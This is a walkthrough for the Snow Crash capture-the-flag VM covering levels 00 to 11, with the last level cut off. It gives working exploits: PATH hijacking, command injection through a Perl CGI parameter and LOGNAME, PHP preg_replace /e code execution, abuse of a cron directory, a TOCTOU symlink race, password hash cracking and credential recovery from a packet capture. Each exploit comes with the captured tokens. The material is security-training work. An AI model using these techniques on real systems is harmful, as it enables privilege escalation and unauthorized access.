# snow-crash

## level00

<details>

<summary> Explanations</summary>

### Finding hints

For the **level00**, nothing relevant is provided in the /home/user/level00 directory. Since we are trying to log on the flag00 user, we can take a look at every files this user owns. To do so, we can use the ``find`` command. In our case:
```bash
find / -user flag00 2> /dev/null
```
The error redirection ``2> /dev/null`` is used to suppress all errors that are irrelevant in our case.

With this command, we get 2 results:
```bash
/usr/sbin/john
/rofs/usr/sbin/john
```

These are classic files, so we can inspect their content with the ``cat`` command. Both of them output the same result:
```bash
cdiiddwpgswtgt
```

At first glance, this could look like a password, so let's try it:
```bash
level00@SnowCrash:~$ su flag00
Password: 
su: Authentication failure
```

This means that this is not the password we are looking for. However, this still could be an **encrypted password**.

### Cipher Identification

To verify our theory, we are going to use the french website [dcode](https://www.dcode.fr/) since this website gives us a very effective [Cipher Identifier](https://www.dcode.fr/cipher-identifier)

After submitting the string ``cdiiddwpgswtgt``, several possible ciphers are shown. Among all of possible relevant ciphers, only some of them actually decode to the same result:
- Affine Cipher
- Disk Cipher
- ROT Cipher
- Caesar Cipher

We might not know all ciphers, but the **Caesar Cipher** is a well-known one. It consists in shifting letters a certain amount of time in a direction:
|  Original  |  a  |  b  |  c  |  d  |  e  |  f  |  g  |  h  |  i  |  j  |  k  |  l  |  m  |  n  |  o  |  p  |  q  |  r  |  s  |  t  |  u  |  v  |  w  |  x  |  y  |  z  |
| :--------: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: | :-: |
|    1 🠜    |  b  |  c  |  d  |  e  |  f  |  g  |  h  |  i  |  j  |  k  |  l  |  m  |  n  |  o  |  p  |  q  |  r  |  s  |  t  |  u  |  v  |  w  |  x  |  y  |  z  |  a  |
|    2 🠞    |  y  |  z  |  a  |  b  |  c  |  d  |  e  |  f  |  g  |  h  |  i  |  j  |  k  |  l  |  m  |  n  |  o  |  p  |  q  |  r  |  s  |  t  |  u  |  v  |  w  |  x  |
|    15 🠞   |  l  |  m  |  n  |  o  |  p  |  q  |  r  |  s  |  t  |  u  |  v  |  w  |  x  |  y  |  z  |  a  |  b  |  c  |  d  |  e  |  f  |  g  |  h  |  i  |  j  |  k  |

In our case, ``cdiiddwpgswtgt`` is a right shift of 15.

### Authentication

So now that we have the decoded string ``nottoohardhere``, we can try to log on the flag00 user:
```bash
level00@SnowCrash:~$ su flag00
Password: 
Don't forget to launch getflag !
flag00@SnowCrash:~$
```

### Retrieving the flag

It worked! We are in. So now, as they ask us to do, we are going to launch getflag:
```bash
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```

We got our flag! Let's see if this is the right flag to go onto the next level:
```bash
flag00@SnowCrash:~$ su level01
Password: 
level01@SnowCrash:~$ 
```

It was indeed the right flag.

</details>

## level01

<details>

<summary>Explanations</summary>

###

For this **level01**, we can, in first place try, to find eventually files owned by flag01, like we did previously:
```bash
level01@SnowCrash:~$ find / -user flag01 2> /dev/null
level01@SnowCrash:~$ 
```

Nothing was found. We are starting from scratch.

### Finding hints

There is something we could have done in level00 that we didn't do, and this is checking database of users.
On linux there is a file named ``passwd`` that contains user login accounts. This file is located in the ``/etc`` directory. So let's ``cat`` this file and ``grep`` everything about our flag01 user:
```bash
level01@SnowCrash:~$ cat /etc/passwd | grep flag01
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

After launching the command, we come across a weird string linked to flag01: ``42hDRfypTqqnw``

If we take a look at others lines of ``/ect/passwd``, we can see there is not anything similar to this:
```
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
```

We can try to use this as a password to log on flag01:
```bash
level01@SnowCrash:~$ su flag01
Password: 
su: Authentication failure
```

This is not it, but let's think for a second. Where do we save not encrypted passwords ?

Nowhere.

We **always** hash passwords. Which means, this is probably a hashed password too!

Good to know, but how are we supposed to crack a hashed password ?

### Cracking the password

**John the Ripper**.

John the Ripper is a wonderful tool when it's about cracking passwords. It autodetects the used algorithm and do its job in consequences.

So let's try using ``john`` on a file containing the password (our ``john`` package is built outside of the VM in a Dockerfile with an entrypoint ``john``):
```bash
➜  level01 git:(main) ✗ docker run john:latest password
Created directory: /root/.john
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (?)
1g 0:00:00:00 100% 2/3 50.00g/s 4096Kp/s 4096Kc/s 4096KC/s 123456..Melvin!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Authentication

After ``john`` did its work, we can observe something very interesting: ``abcdefg``. 

Could it be the password we are looking for ? Let's try it:
```bash
level01@SnowCrash:~$ su flag01
Password: 
Don't forget to launch getflag !
```

### Retrieving the flag

```bash
flag01@SnowCrash:~$ getflag
  Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

```bash
flag01@SnowCrash:~$ su level02
Password: 
level02@SnowCrash:~$ 
```

And exactly as the previous level, it worked! And we are now in the **level02**

</details>

## level02

<details>

<summary>Explanations</summary>

###

For the level02, we get a file for the first time:
```bash
level02@SnowCrash:~$ ls
level02.pcap
```

``level02.pcap`` is a pcap (packet capture) file and is used to capture a network traffic

The file itself is unreadable, using ``cat`` is useless **HOWEVER**, if we can the file and look at the output, we can find an interesting line:
```
Password: Nf&NatB'̊$E4��@@J-;���;��ߙO/Y�{���%�s��
```

It is of course not humanly readable, but now we know that the password we are looking for is in this file! We now need to find a way of reading it.

To proceed, we will be using [TShark](https://tshark.dev/), a terminal version of WireShark (our ``tshark`` package is built outside of the VM in a Dockerfile with an entrypoint ``tshark``).

TShark provides various ways to extract information from pcap files. The most relevant feature for our analysis is the ``-z`` flag with the ``follow`` option (``-z follow,prot,mode,filter``). This allows us to reassemble and view the full data stream between two endpoints, exactly as the users saw it.

``prot`` specifies the protocol like TCP, UDP, SSL

``mode`` specifies the output mode like ASCII, HEX, RAW

``filter`` specifies the stream to be displayed

In our case, the protocol is TCP, we want our output in HEX for easy read, and it will be really useful here

So now let's run the command:
```bash
➜  level02 git:(main) ✗ docker run tshark:latest -r level02.pcap -qz follow,tcp,hex,0
Running as user "root" and group "root". This could be dangerous.

===================================================================
Follow: tcp,hex
Filter: tcp.stream eq 0
Node 0: 59.233.235.218:39247
Node 1: 59.233.235.223:12121
        00000000  ff fd 25                                          ..%
...
        0000007E  0d 0a 4c 69 6e 75 78 20  32 2e 36 2e 33 38 2d 38  ..Linux  2.6.38-8
        0000008E  2d 67 65 6e 65 72 69 63  2d 70 61 65 20 28 3a 3a  -generic -pae (::
        0000009E  66 66 66 66 3a 31 30 2e  31 2e 31 2e 32 29 20 28  ffff:10. 1.1.2) (
        000000AE  70 74 73 2f 31 30 29 0d  0a 0a 01 00 77 77 77 62  pts/10). ....wwwb
        000000BE  75 67 73 20 6c 6f 67 69  6e 3a 20                 ugs logi n:
000000B2  6c                                                l
        000000C9  00 6c                                             .l
000000B3  65                                                e
        000000CB  00 65                                             .e
000000B4  76                                                v
        000000CD  00 76                                             .v
000000B5  65                                                e
        000000CF  00 65                                             .e
000000B6  6c                                                l
        000000D1  00 6c                                             .l
000000B7  58                                                X
        000000D3  00 58                                             .X
000000B8  0d                                                .
        000000D5  01                                                .
        000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20           ...Passw ord:
000000B9  66                                                f
000000BA  74                                                t
000000BB  5f                                                _
000000BC  77                                                w
000000BD  61                                                a
000000BE  6e                                                n
000000BF  64                                                d
000000C0  72                                                r
000000C1  7f                                                .
000000C2  7f                                                .
000000C3  7f                                                .
000000C4  4e                                                N
000000C5  44                                                D
000000C6  52                                                R
000000C7  65                                                e
000000C8  6c                                                l
000000C9  7f                                                .
000000CA  4c                                                L
000000CB  30                                                0
000000CC  4c                                                L
000000CD  0d                                                .
        000000E3  00 0d 0a                                          ...
        000000E6  01                                                .
        000000E7  00 0d 0a 4c 6f 67 69 6e  20 69 6e 63 6f 72 72 65  ...Login  incorre
        000000F7  63 74 0d 0a 77 77 77 62  75 67 73 20 6c 6f 67 69  ct..wwwb ugs logi
        00000107  6e 3a 20                                          n:
===================================================================
```

Executing this command reveals an interesting string: ``ft_wandr...NDRel.L0L.``.

While this looks like a password, a closer inspection of the hexadecimal output shows that the dots ``.`` correspond to the value ``7f``. In ASCII, ``0x7f`` represents the ``DEL`` (Delete) control character, not a literal dot.

By interpreting each ``7f`` as a backspace, we can reconstruct the actual password: ``ft_waNDReL0L``. The final character (a dot again), ``0x0d``, is a Carriage Return, indicating the user pressed ENTER.

### Authentication

Now, let's try it:
```bash
level02@SnowCrash:~$ su flag02
Password: 
Don't forget to launch getflag !
```

It worked! So now let's get the flag

### Retrieving the flag
```bash
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
```

```bash
flag02@SnowCrash:~$ su level03
Password: 
level03@SnowCrash:~$ 
```

The flag is valid! So let's go on the next level

</details>

## level03

<details>

<summary>Explanations</summary>

###

For this level, we have a file entitled ``level03``. This file is a binary. When executing it, it does this:
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

We don't get nothing much by executing the program. However, we can check what the program actually does with the ``ltrace`` command:
```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                                         = 2003
geteuid()                                                                                                                         = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 0
+++ exited (status 0) +++
```

As we can see, the program is actually making a call to ``echo``. This is our door. Since the program is using the ``PATH`` to ``echo``, we can modify the ``PATH`` to run our own ``echo`` command.

### Retrieving the token

To do so, we need to create our fake echo and making it executable:
```bash
level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
```

Now that it's done, we need to add the path where is located our fake echo in the ``PATH`` before the actual path of ``echo``:
```bash
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

And now, when we try to execute the ``level03`` program:
```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

If we try the flag:
```bash
level03@SnowCrash:~$ su level04
Password: 
level04@SnowCrash:~$ 
```

The flag is the right one!

</details>


## level04

<details>

<summary>Explanations</summary>

###

This time we also get a file entitled ``level04.pl``. ``.pl`` means that this is a Perl file. When executing the Perl file, we get this:
```bash
level04@SnowCrash:~$ perl level04.pl 
Content-type: text/html


level04@SnowCrash:~$
```

And when we display what is infile the file, we get this:
```bash
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

As we can see the CGI (Common Gateway Interface) is used. CGI scripts are useful [to write dynamic program for the Web](https://www.perl.com/article/perl-and-cgi/).

To interact with these scripts, using ``perl`` is not the only way. We can making a request to the right address. Here the address is given: ``localhost:4747``
```bash
level04@SnowCrash:~$ curl localhost:4747

level04@SnowCrash:~$
```

But nothing happens.

If we take a closer look at the code, we can see that the script actually takes a param ``x`` and is supposed to display it. So let's try again but this time with a ``x`` param in our url:
```bash
level04@SnowCrash:~$ curl localhost:4747/?x=test
test
```

This time it worked! And this is where we are going to attack.

### Retrieving the token

In Perl, we need to becareful when letting the possibility to put people's own params (https://perldoc.perl.org/perlsec)

In our case, we can manipulate what we send to run our own command. How? By closing earlier ``echo``'s quotes!

If I say that my ``x``'s value is something like `` `/bin/get/flag` ``, the ``print`` line will look like this ``print `echo `/bin/getflag` 2>&1`;``.

``echo`` will stop instantly, to let our /bin/getflag command execute:
```bash
level04@SnowCrash:~$ curl 'localhost:4747/?x=`/bin/getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

We just had to had ``'``, otherwise `` ` `` won't count (thanks to bash's parsing with quotes)

But now we have our token! Let's see if the token is the right one:
```bash
level04@SnowCrash:~$ su level05
Password: 
level05@SnowCrash:~$ 
```

The token is indeed valid!

</details>

## level05

<details>

<summary>Explanations</summary>

### Finding hints

We are back on a level without any file in first place. However, when logging on the level 05 user, we received this:
```bash
level05@127.0.0.1's password: 
You have new mail.
level05@SnowCrash:~$
```

We apparently received a mail, so let's check it out:
```bash
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

With this mail named ``level05``, we learn that the mail was sent by flag05, the user we are trying to get the flag from.

The content of the mail looks familiar tho. It is actually a cron script. This is our big hint. We learn from that that every 2 minutes, flag05 is running this command: ``su -c "sh /usr/sbin/openarenaserver"``

Let's check what is the script ``/usr/sbin/openarenaserver`` then:
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

What this script does is looping on every file of the directory ``/opt/openarenaserver/``, executing each one by one with ``bash -x "$i"``, and then deleting each one by one after executing each with ``rm -f "$i"``.

This is from there that we need to get our flag. Since the cron is made by flag05, it is possible to make the user flag05 execute whatever we want. And so that's what we are going to do. We want to gather the flag with the command ``getflag``, so let's make the cron do it for us:

### Retrieving the token

- First, we need to create script that runs ``getflag`` and saves the output:
```bash
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/flag" > /tmp/getflag.sh
```

- Then, we need to make this script executable and moving it into ``/opt/openarenaserver/``:
```bash
level05@SnowCrash:~$ chmod +x /tmp/getflag.sh
level05@SnowCrash:~$ cp /tmp/getflag.sh /opt/openarenaserver/getflag.sh
```

And now we have to wait for the cron to execute ``usr/sbin/openarenaserver`` on its own. When it's done, a new file ``/tmp/flag`` will be created:
```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

It contains a token, let's check if this is the right one:
```bash
level05@SnowCrash:~$ su level06
Password: 
level06@SnowCrash:~$ 
```

It worked!

</details>

## level06

<details>

<summary>Explanations</summary>

###

For this level, we are given 2 files:
- A program: ``level06``
- A PHP file: ``level06.php``

When trying to use the program, we learn that we need to pass an filename as argument:
```bash
level06@SnowCrash:~$ ./level06 
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

We could try to pass the PHP file but it wouldn't look like anything. However, we can inspect the PHP file.
```bash
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

If we compare the error we got when trying to launch the program, and what is on line 4 of the PHP file, we can see that the same function is present. Also, if we look at the bottom of the file, we can read ``argv[1]``, ``argv[2]``. This means that the PHP file can be used as a program.

Since we can't really check the code of the ``level06`` program, we are going to acknowledge that ``level06.php`` is the code of the program ``level06`` because of how similar it is.

Now we should take a closer look on the code of the program to understand how it works and where is our entrypoint.

### Understanding the PHP file

First, let's read what the code is doing:

- 1. It calls a function named ``x``, with as an arg ``$argv[1]`` (our file) and ``$argv[2]`` (that is never used), and that will return in a ``$r`` variable
- 2. The ``x`` function calls another function named ``file_get_contents`` with our ``$y`` variable (that is ``$argv[1]`` since it's the first arg of ``x`` function)
``file_get_contents`` with read the entire file and store it into ``$a``.
- 3. Then, ``x`` function is going to call ``preg_replace``. ``preg_replace`` is a function that searches for matches in a string (3rd arg) with a regex (1st arg) to replace with a replacement (2nd arg).

In our case, the regex is looking for a string starting with ``[x ``, that can have infinite chars after and that ends with ``]``.

The replacement is a string return by the function ``$y`` that also uses ``preg_replace`` to transform ``.`` into ``x`` and ``@`` into ``y``.

The string to modify is the content of the ``$a``, the content of the file.

And we don't more information. Because we can observe something that is our entrypoint: ``/e``. ``/e`` means that whatever will be gathered by the regex, can execute code. Which is perfect for us.

### Retrieving the token

To make the PHP program run code, we need to give it a file, with a special string that will be read as code. But we also need to respect the regex format:
```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/level06
```

It starts with ``[x`` and end with ``]``. So the regex will recognize this and keep ``${`getflag`}``.

Why do we use ``${` `}`` tho?

The only way to make the PHP code act differently is to use ``${}``, because this is also how variables can be interpreted. And we use the backticks `` ` `` because these are an execution operator.

So basically:
- 1. We say to the PHP code that we want to interpret a variable with ``${}``
- 2. Then, we run the code inside of it with `` ` ``

Now let's try it:
```bash
level06@SnowCrash:~$ ./level06 /tmp/level06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

As we can see, the code doesn't understand the variable, BUT, still ran the code inside, which gives us, a token ``wiok45aaoguiboiki2tuin6ub``:
```bash
level06@SnowCrash:~$ su level07
Password: 
level07@SnowCrash:~$ 
```

And it is indeed, once again, the valid token!

</details>

## level07

<details>

<summary>Explanations</summary>

###

Once again, we have a file named ``level07``. This is a program, when executing it, this happen:
```bash
level07@SnowCrash:~$ ./level07 
level07
```

It writes the name of the level, and nothing else. We don't have anything else on the session. So let's check what the program actually does with ``ltrace``:
```bash
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                                         = 2007
geteuid()                                                                                                                         = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
getenv("LOGNAME")                                                                                                                 = "level07"
asprintf(0xbffff734, 0x8048688, 0xbfffff69, 0xb7e5ee55, 0xb7fed280)                                                               = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                            = 0
+++ exited (status 0) +++
```

As we can see, it's a basic ``echo`` of the name of the level. But if we look more closely, we can see this: ``getenv("LOGNAME") = "level07"``. Let's try something:
```bash
level07@SnowCrash:~$ export LOGNAME=test
level07@SnowCrash:~$ ./level07 
test
```

What the program prints is actually the ``LOGNAME`` env var.

### Retrieving the token

There is an easy way to execute command with ``echo``: ``echo $(command)``. So let's change the ``LOGNAME`` env var to ``getflag``:
```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

And here we have a token. So, let's try it:
```bash
level07@SnowCrash:~$ su level08
Password: 
level08@SnowCrash:~$ 
```

It worked once more!

</details>

## level08

<details>

<summary>Explanations</summary>

###

For this level, we have 2 files:
- A program named ``level08``
- A file named ``token``

When executing the program, this happens:
```bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
```

So what we can do, is use the ``token`` file:
```bash
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

We can't access this file that easy. Let's check what does the program try to do at least:
```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                                          = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                                                      = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

The first thing the program does, is comparing 2 strings, here token and token, so let's try to read another file:
```bash
level08@SnowCrash:~$ echo "test" > /tmp/test
level08@SnowCrash:~$ ltrace ./level08 /tmp/test
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/test", "token")                                                                                                      = NULL
open("/tmp/test", 0, 014435162522)                                                                                                = 3
read(3, "test\n", 1024)                                                                                                           = 5
write(1, "test\n", 5test
)                                                                                                             = 5
+++ exited (status 5) +++
```

This time the program worked, but we can see learn that actually the ``strstr`` is comparing the name of the file with a ``token`` string. So it's either:
- The program return an error if we try to open a file named ``token``
- The program can't read the ``token`` file because of a lack of permission

So let's try the first theory:
```bash
level08@SnowCrash:~$ echo "test" > /tmp/token
level08@SnowCrash:~$ ./level08 /tmp/token
You may not access '/tmp/token'
```

And this is it. The program is not letting us interact with files named ``token``. So we need to find a way to bypass that. But we don't have the permissions to change the name of the original ``token`` file. We can't copy it either.

So how are we going to bypass that?

### Retrieving the token

We can actually use a symlink to use another name for the exact same file:
```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/bypass
level08@SnowCrash:~$ ./level08 /tmp/bypass
quif5eloekouj29ke0vouxean
```

But this is weird. Usually, when we get a token, we need to use the command ``getflag`` and after doing so, there should a whole text, that is not here in this level.

But well, let's still try it:
```bash
level08@SnowCrash:~$ su level09
Password: 
su: Authentication failure
```

So this wasn't our token. But we know that the token is located into ``flag08`` user's files. So maybe this is our password:
```bash
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
```

It was the password! So now let's get the token and go on the next level:
```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password: 
level09@SnowCrash:~$ 
```

</details>

## level09

<details>

<summary>Explanations</summary>

###

For this level, we have:
- A progam named ``level09``
- A file named ``token``

This is kind of like the previous level, BUT this time, we can't ``ltrace`` the program, and we can read the token file:
```bash
level09@SnowCrash:~$ ltrace ./level09 
__libc_start_main(0x80487ce, 1, 0xbffff7f4, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2fe38)                   = -1
puts("You should not reverse this"You should not reverse this
)              = 28
+++ exited (status 1) +++

level09@SnowCrash:~$ cat token 
f4kmm6p|=�p�n��DB�Du{��
```

We need to understand by ourselves what the program does:
```bash
level09@SnowCrash:~$ ./level09 
You need to provied only one arg.
level09@SnowCrash:~$ ./level09 abcde
acegi
level09@SnowCrash:~$ ./level09 01234
02468
level09@SnowCrash:~$ ./level09 aaaaa
abcde
level09@SnowCrash:~$ ./level09 00000
01234
```

As we can see, the program takes a string, and return as string too. If we look closer at the output, we can see that it is not much different from our input. And if we compare the 2 last tests, we can see that the program add 0 on the 1st char, 1 on the 2nd char, 2 on the 3rd char, ...:
```bash
level09@SnowCrash:~$ ./level09 aaaaa
abcde

- a -> 97 + 0 = a
- a -> 97 + 1 = b
- a -> 97 + 2 = c
- a -> 97 + 3 = d
- a -> 97 + 4 = e
```

```bash
level09@SnowCrash:~$ ./level09 00000
01234

- 0 -> 48 + 0 = 0
- 0 -> 48 + 1 = 1
- 0 -> 48 + 2 = 2
- 0 -> 48 + 3 = 3
- 0 -> 48 + 4 = 4
```

So what if we try to apply the same logic on our 2 first tests:
```bash
level09@SnowCrash:~$ ./level09 abcde
acegi

- a -> 97  + 0 = a
- b -> 98  + 1 = c
- c -> 99  + 2 = e
- d -> 100 + 3 = g
- e -> 101 + 4 = i
```

```bash
level09@SnowCrash:~$ ./level09 01234
02468

- 0 -> 48 + 0 = 0
- 1 -> 49 + 1 = 2
- 2 -> 50 + 2 = 4
- 3 -> 51 + 3 = 6
- 4 -> 52 + 4 = 8
```

This logic does match others tests!

So what if, the token got modify with ``level09`` program?

### Retrieving the token

If this is indeed the case, we then need to reverse it. To do so, we are going to code a little program that does the opposite of what ``level09`` does:
```C
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
	int i = 0;
	int ascii = 0;
	char str[100] = {0};

	int fd = open("token", O_RDONLY);
	read(fd, str, 99);

	while (str[i]) {
		str[i] = str[i] - ascii;
		i++;
		ascii++;
	}

	printf("%s\n", str);
}
```

This program is going to open a ``token`` file and for each char of it, it's going to substract 0 at the first char, 1 at the second char, ect, to reverse what ``level09``. But now we need to get the token file out of our VM:
```bash
➜  level09 git:(main) ✗ scp -P 4242 level09@127.0.0.1:~/token . 
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 
level09@127.0.0.1's password: 
token                                                                                                                                                                         100%   26    25.8KB/s   00:00

➜  level09 git:(main) ✗ ls       
reverse.c  token
➜  level09 git:(main) ✗ cat token 
f4kmm6p|=�p�n��DB�Du{��
```

Now that we have our ``token`` file, we can compile the program and try it out:
```bash
➜  level09 git:(main) ✗ ./a.out token                          
f3iji1ju5yuevaus41q1afiuq�
```

There is a non-printable char at the end, but this is actually a ``/n`` - 26, so let's just remove it: ``f3iji1ju5yuevaus41q1afiuq``. If this is like the previous level, this is not our token, but the password for the flag:
```bash
level09@SnowCrash:~$ su flag09
Password: 
Don't forget to launch getflag !
```

Let's now get the token and go on the next level
```bash
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
flag09@SnowCrash:~$ su level10
Password: 
level10@SnowCrash:~$ 
```

</details>

## level10

<details>

<summary>Explanations</summary>

###

This time again, we have 2 files:
- A progam named ``level10``
- A file named ``token``

We don't have any permission on ``token`` and when executing ``level10``, this happens:
```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
```

The program asks us to send a file, and give a host. We have our file ``token``, but we have no permission on it. And we don't have a host. We could create it, but we don't know on which port the program is trying to connect to. So let's use a valid file, and a random host to check what the program does:
```bash
level10@SnowCrash:~$ ltrace ./level10 /tmp/test 0
__libc_start_main(0x80486d4, 3, 0xbffff7e4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)                                      = 0
printf("Connecting to %s:6969 .. ", "0")                    = 24
fflush(0xb7fd1a20Connecting to 0:6969 .. )                                          = 0
socket(2, 1, 0)                                             = 3
inet_addr("0")                                              = NULL
htons(6969, 1, 0, 0, 0)                                     = 14619
connect(3, 0xbffff72c, 16, 0, 0)                            = -1
printf("Unable to connect to host %s\n", "0"Unable to connect to host 0
)               = 28
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

After doing so, we learn that the program connects to port ``6969``. So let's create our host and try to see what happens with a valid file:
```bash
level10@SnowCrash:~$ nc -lk 6969

# In another terminal:
level10@SnowCrash:~$ ./level10 /tmp/test 0
Connecting to 0:6969 .. Connected!
Sending file .. wrote file!
######################

.*( )*.
test
```

The program sends ``.*( )*.`` to the host and then ``test``, which is the content of our file ``/tmp/test``. So this is how we are going to get the content of ``token``. But we have no permission on it. And this is where the program is important. First, let's take a look at what the program does when it works:
```bash
access("/tmp/test", 4)                                      = 0
printf("Connecting to %s:6969 .. ", "0")                    = 24
fflush(0xb7fd1a20Connecting to 0:6969 .. )                                          = 0
socket(2, 1, 0)                                             = 3
inet_addr("0")                                              = NULL
htons(6969, 1, 0, 0, 0)                                     = 14619
connect(3, 0xbffff72c, 16, 0, 0)                            = 0
write(3, ".*( )*.\n", 8)                                    = 8
printf("Connected!\nSending file .. "Connected!
)                      = 27
fflush(0xb7fd1a20Sending file .. )                                          = 0
open("/tmp/test", 0, 010)                                   = 4
read(4, "test\n", 4096)                                     = 5
write(3, "test\n", 5)                                       = 5
puts("wrote file!"wrote file!
)                                         = 12
+++ exited (status 12) +++
```

### Authentication

It checks the access to the file, and then open it if we are able to connect. There is actually a well-known bug with that, called ``time-of-check to time-of-use`` (TOCTOU). This consists in changing the link of the file **BETWEEN** the _check_, and the _use_. To do so, we need to use a **symlink**. We need to pass the symlink of a valid file to the program and be fast enough to change the symlink of the valid file to our ``token`` file. But as basic humans, we can't be THAT fast, so we need to use infinite loops:
- One loop that is going swap our link between a valid file, and the ``token`` file:
```bash
#!/bin/bash
touch /tmp/fakefile
while true; do
        ln -sf /tmp/fakefile /tmp/link
        ln -sf ~/token /tmp/link
done
```

- Another loop that is going to execute the program with the symlink as an arg:
```bash
#!/bin/bash
while true; do
	~/./level10 /tmp/link 0
done
```

Now, let's execute both scripts and see what happens in the host:
```bash
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
```

### Retrieving the token

We get either empty answer (which is normal since our fakelink file is empty), either ``woupa2yuojeeaaed06riuj63c``.

The only different string that can show, is our ``token`` file content. But as the previous levels, there is no getflag message. So let's try to log in the ``flag10`` user first:
```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
```

It is indeed the password of the ``flag10`` user, let's get the token now and move onto the next level:
```bash
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$ su level11
Password: 
level11@SnowCrash:~$ 
```

</details>

## level11

<details>

<summary>Explanations</summary>

###

Once more, we have a file: ``level09.lua``. When executing it, this happens:
```bash
level11@SnowCrash:~$ lua level11.lua 
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
